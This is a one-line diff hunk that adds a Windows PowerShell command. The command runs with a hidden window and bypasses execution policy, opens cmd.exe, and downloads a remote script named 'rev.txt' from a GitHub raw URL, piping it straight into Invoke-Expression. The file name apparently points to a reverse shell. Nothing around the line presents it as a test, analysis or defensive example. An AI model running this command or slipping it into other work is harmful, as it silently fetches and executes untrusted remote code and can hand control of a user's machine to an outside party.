@@ -1,0 +1,1 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w h -ExecutionPolicy Bypass -Command "Start-Process 'C:\WINDOWS\system32\cmd.exe'; irm https://raw.githubusercontent.com/Unit-259/examples/refs/heads/main/rev.txt | iex"
